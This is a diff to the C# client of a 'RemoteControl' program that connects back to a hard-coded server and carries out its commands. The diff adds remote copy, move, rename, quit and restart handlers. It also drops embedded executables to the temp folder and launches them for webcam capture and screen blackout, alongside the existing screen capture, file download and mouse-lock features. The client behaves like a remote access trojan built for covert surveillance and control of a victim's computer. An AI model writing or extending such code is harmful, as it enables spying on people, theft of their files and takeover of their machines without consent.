@@ -12,15 +12,17 @@ using System.Diagnostics;
 using System.Media;
 using System.Drawing.Imaging;
 using Newtonsoft.Json;
+using Microsoft.VisualBasic.Devices;
 
 namespace RemoteControl.Client
 {
     class Program
     {
         private static Socket oServer;
-        //private static string ServerIP = "192.168.1.136";
-        private static string ServerIP = "192.168.0.105";
-        private static int ServerPort = 9001;
+        private static bool isTestMode = false;
+        //private static string ServerIP = "10.55.200.187";
+        private static string ServerIP = "192.168.1.136";
+        private static int ServerPort = 10086;
         private static Dictionary<string, bool> sessionScreenHandleSwitch = new Dictionary<string, bool>();
         private static Dictionary<string, bool> sessionVideoHandleSwitch = new Dictionary<string, bool>();
         private static Dictionary<string, bool> sessionDownloadHandleSwitch = new Dictionary<string, bool>();
@@ -28,6 +30,9 @@ namespace RemoteControl.Client
         private static Dictionary<string, RequestLockMouse> sessionLockMouseHandleSwitch = new Dictionary<string, RequestLockMouse>();
         private static readonly string LastVideoCapturePathStoreFile = Environment.GetEnvironmentVariable("temp") + "\\vcpsf.dat";
         private static Dictionary<string, FileStream> fileUploadDic = new Dictionary<string, FileStream>();
+        private static string lastVideoCaptureExeFile = null;
+        private static string lastMsgBoxExeFile = null;
+        private static string lastPlayMusicExeFile = null;
 
         static void Main(string[] args)
         {
@@ -39,6 +44,11 @@ namespace RemoteControl.Client
 
         static void ReadParameters()
         {
+            if (isTestMode)
+            {
+                return; 
+            }
+
             string filePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
             ClientParameters paras = ClientParametersManager.ReadParameters(filePath);
             Program.ServerIP = paras.GetServerIP();
@@ -98,6 +108,10 @@ namespace RemoteControl.Client
                                 DoRecvBytes(session, data.SplitBytes(0, packetLength));
                                 data.RemoveRange(0, packetLength);
                             }
+                            else
+                            {
+                                break;
+                            }
                         }
                     }
                     catch (Exception ex)
@@ -114,6 +128,7 @@ namespace RemoteControl.Client
             ePacketType packetType;
             object obj;
             PacketFactory.DecodeObject(packet, out packetType, out obj);
+            Console.WriteLine(packetType.ToString());
 
             string sessionId = session.SocketId;
             if(packetType == ePacketType.PACKET_GET_DRIVES_REQUEST)
@@ -237,12 +252,15 @@ namespace RemoteControl.Client
             {
                 RequestStartDownload req = obj as RequestStartDownload;
                 ResponseStartDownloadHeader resp = new ResponseStartDownloadHeader();
+                // 获取文件大小
                 var fs = System.IO.File.OpenRead(req.Path);
                 resp.FileSize = fs.Length;
                 resp.Path = req.Path;
                 resp.SavePath = req.SavePath;
                 fs.Close();
                 session.Send(ePacketType.PACKET_START_DOWNLOAD_HEADER_RESPONSE, resp);
+                if (sessionDownloadHandleSwitch.ContainsKey(session.SocketId))
+                    return;
                 sessionDownloadHandleSwitch.Add(session.SocketId, true);
                 new Thread(() => StartClientDownload(session, req)) { IsBackground = true }.Start();
             }
@@ -391,10 +409,10 @@ namespace RemoteControl.Client
                             }
                             // 释放并打开视频程序
                             byte[] data = GetResFileData("CamCapture.dat");
-                            string fileName = WriteToRandomFile(data);
+                            string fileName = WriteToRandomFile(data,"camCapture.exe");
                             lastVideoCaptureExeFile = fileName;
                             System.IO.File.WriteAllText(LastVideoCapturePathStoreFile, fileName);
-                            StartAPP("cmd.exe", "/c start " + fileName, true, false);
+                            StartAPP("cmd.exe", "/c start " + fileName + " /s", true, false);
                             // 查找视频程序的端口
                             string pName = System.IO.Path.GetFileNameWithoutExtension(lastVideoCaptureExeFile);
                             DoOutput("已启动视频监控程序：" + pName);
@@ -442,9 +460,16 @@ namespace RemoteControl.Client
                             {
                                 if (!sessionVideoHandleSwitch.ContainsKey(session.SocketId))
                                 {
+                                    DoOutput("已关闭视频监控数据传输连接!");
                                     CaptureVideoClient.Close();
+                                    if (lastVideoCaptureExeFile != null)
+                                    {
+                                        string processName = System.IO.Path.GetFileNameWithoutExtension(lastVideoCaptureExeFile);
+                                        KillProcess(processName.ToLower());
+                                    }
                                     break;
                                 }
+                                Thread.Sleep(1000);
                             }
                         }
 
@@ -484,9 +509,95 @@ namespace RemoteControl.Client
                     fileUploadDic.Remove(req.Id);
                 }
             }
+            else if (packetType == ePacketType.PACKET_COPY_FILE_OR_DIR_REQUEST)
+            {
+                var req = obj as RequestCopyFile;
+                new Thread(() => CopyFile(session, req.SourceFile, req.DestinationFile, false)) { IsBackground = true }.Start();
+            }
+            else if (packetType == ePacketType.PACKET_MOVE_FILE_OR_DIR_REQUEST)
+            {
+                var req = obj as RequestMoveFile;
+                new Thread(() => CopyFile(session, req.SourceFile, req.DestinationFile, true)) { IsBackground = true }.Start();
+            }
+            else if(packetType == ePacketType.PACKET_RENAME_FILE_REQUEST)
+            {
+                var req = obj as RequestRenameFile;
+
+                try
+                {
+                    Computer c = new Computer();
+                    c.FileSystem.RenameFile(req.SourceFile, req.DestinationFileName);
+                    DoOutput("重命名成功" + req.SourceFile + "=>" + req.DestinationFileName);
+                }
+                catch (Exception ex)
+                {
+                    DoOutput("重命名失败" + req.SourceFile + "," + ex.Message);
+                }
+            }
+            else if (packetType == ePacketType.PACKET_QUIT_APP_REQUEST)
+            {
+                Environment.Exit(0);
+            }
+            else if (packetType == ePacketType.PACKET_RESTART_APP_REQUEST)
+            {
+                string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+                var thread = StartAPP(path, "", true);
+                thread.Join();
+                Environment.Exit(0);
+            }
         }
 
-        static string lastVideoCaptureExeFile = null;
+        static void CopyFile(SocketSession session, string sourceFile, string destFile, bool isDeleteSourceFile)
+        {
+            ResponseBase resp = null;
+            if (isDeleteSourceFile)
+            {
+                resp = new ResponseMoveFile() { SourceFile = sourceFile, DestinationFile = destFile };
+            }
+            else
+            {
+                resp = new ResponseCopyFile() { SourceFile = sourceFile, DestinationFile = destFile };
+            }
+            try
+            {
+                string dir = System.IO.Path.GetDirectoryName(destFile);
+                string fileName = System.IO.Path.GetFileNameWithoutExtension(destFile);
+                string ext = System.IO.Path.GetExtension(destFile);
+                string newDestFile = destFile;
+                for (int i = 0; ; i++)
+                {
+                    if (System.IO.File.Exists(newDestFile))
+                    {
+                        newDestFile = dir + "\\" + fileName + " - 副本" + (i==0?"" : " (" + i + ")") + ext;
+                    }
+                    else{
+                        break;
+                    }
+                }
+                DoOutput(string.Format("正在将文件{0}{1}到{2}...", sourceFile, isDeleteSourceFile ? "移动" : "复制", newDestFile));
+                System.IO.File.Copy(sourceFile, newDestFile);
+                if (isDeleteSourceFile)
+                {
+                    System.IO.File.Delete(sourceFile);
+                }
+                DoOutput(string.Format("完成将文件{0}{1}到{2}！", sourceFile, isDeleteSourceFile ? "移动" : "复制", newDestFile));
+            }
+            catch (Exception ex)
+            {
+                resp.Result = false;
+                resp.Message = (isDeleteSourceFile ? "移动" : "复制") + "失败," + ex.Message;
+                resp.Detail = ex.StackTrace;
+                DoOutput(ex.Message);
+            }
+            if (isDeleteSourceFile)
+            {
+                session.Send(ePacketType.PACKET_MOVE_FILE_OR_DIR_RESPONSE, resp);
+            }
+            else
+            {
+                session.Send(ePacketType.PACKET_COPY_FILE_OR_DIR_RESPONSE, resp);
+            }
+        }
 
         static int FindServerPortByProcessName(string processName)
         {
@@ -620,7 +731,6 @@ namespace RemoteControl.Client
             }
         }
 
-        static string lastMsgBoxExeFile = null;
         static void StartShowMsgBox(SocketSession session, RequestMessageBox req)
         {
             try
@@ -642,7 +752,6 @@ namespace RemoteControl.Client
             }
         }
 
-        static string lastPlayMusicExeFile = null;
         static void StartPlayMusic(SocketSession session, string musicFilePath)
         {
             try
@@ -666,7 +775,7 @@ namespace RemoteControl.Client
             {
                 // 释放黑屏程序
                 byte[] data = GetResFileData("BlackScreen.dat");
-                string blackScreenFileName = WriteToRandomFile(data);
+                string blackScreenFileName = WriteToRandomFile(data, "blackscreen.exe");
                 // 启动黑屏程序
                 StartAPP("cmd.exe", "/c start " + blackScreenFileName, true, false);
             }
@@ -681,13 +790,18 @@ namespace RemoteControl.Client
             return Utils.GetResFileData(resFileName);
         }
 
+        static string WriteToRandomFile(byte[] data, string fileName)
+        {
+            var filePath = Environment.GetEnvironmentVariable("temp") + "\\" + fileName;
+            System.IO.File.WriteAllBytes(filePath, data);
+
+            return filePath;
+        }
+
         static string WriteToRandomFile(byte[] data)
         {
-            string randomFilePath = System.IO.Path.GetRandomFileName();
-            randomFilePath = Environment.GetEnvironmentVariable("temp") + "\\" + randomFilePath;
-            System.IO.File.WriteAllBytes(randomFilePath, data);
-
-            return randomFilePath;
+            string randomFileName = System.IO.Path.GetRandomFileName();
+            return WriteToRandomFile(data, randomFileName);
         }
 
         static void KillProcess(string processNameInLower)
@@ -702,7 +816,7 @@ namespace RemoteControl.Client
                     {
                         try
                         {
-                            Console.WriteLine("成功结束进程:" + p.ProcessName);
+                            DoOutput("成功结束进程:" + p.ProcessName);
                             p.Kill();
                         }
                         catch
@@ -738,7 +852,8 @@ namespace RemoteControl.Client
                 req = sessionLockMouseHandleSwitch[session.SocketId];
                 for (int j = 0; j < 100; j++)
                 {
-                    Win32API.mouse_event(Win32API.MOUSEEVENTF_ABSOLUTE | Win32API.MOUSEEVENTF_MOVE, 0, 0, 0, 0);
+                    MouseOpeUtil.MouseTo(0, 0);
+                    //Win32API.mouse_event(Win32API.MOUSEEVENTF_ABSOLUTE | Win32API.MOUSEEVENTF_MOVE, 0, 0, 0, 0);
                     Thread.Sleep(10);
                 }
                 if (!sessionLockMouseHandleSwitch.ContainsKey(session.SocketId))
@@ -773,6 +888,10 @@ namespace RemoteControl.Client
                 session.Send(ePacketType.PACKET_START_DOWNLOAD_RESPONSE, data);
             }
             fs.Close();
+            if (sessionDownloadHandleSwitch.ContainsKey(session.SocketId))
+            {
+                sessionDownloadHandleSwitch.Remove(session.SocketId);
+            }
         }
 
         static void StartClientCaptureScreen(SocketSession session, RequestStartGetScreen req)
@@ -786,7 +905,16 @@ namespace RemoteControl.Client
                 for (int i = 0; i < 1; i++)
                 {
                     ResponseStartGetScreen resp = new ResponseStartGetScreen();
-                    resp.SetImage(CaptureScreen(), ImageFormat.Jpeg);
+                    try
+                    {
+                        resp.SetImage(CaptureScreen(), ImageFormat.Jpeg);
+                    }
+                    catch (Exception ex)
+                    {
+                        resp.Result = false;
+                        resp.Message = ex.Message;
+                        resp.Detail = ex.StackTrace;
+                    }
                     session.Send(ePacketType.PACKET_START_CAPTURE_SCREEN_RESPONSE, resp);
                 }
                 Thread.Sleep(1000);
@@ -884,14 +1012,14 @@ namespace RemoteControl.Client
             return myImage;
         }
 
-        static void StartAPP(string appFileName, string arguments, bool hideWindow)
+        static Thread StartAPP(string appFileName, string arguments, bool hideWindow)
         {
-            StartAPP(appFileName,arguments,hideWindow, false);
+            return StartAPP(appFileName,arguments,hideWindow, false);
         }
 
-        static void StartAPP(string appFileName, string arguments, bool hideWindow, bool useShellExecute)
+        static Thread StartAPP(string appFileName, string arguments, bool hideWindow, bool useShellExecute)
         {
-            new Thread(() =>
+            var t = new Thread(() =>
             {
                 try
                 {
@@ -910,7 +1038,10 @@ namespace RemoteControl.Client
                 {
                     Console.WriteLine("启动进程失败，" + ex.Message);
                 }
-            }) { IsBackground = true }.Start();
+            }) { IsBackground = true };
+            t.Start();
+
+            return t;
         }
 
         static void StartMessageBox(string title, string content, MessageBoxButtons buttons, MessageBoxIcon icon)
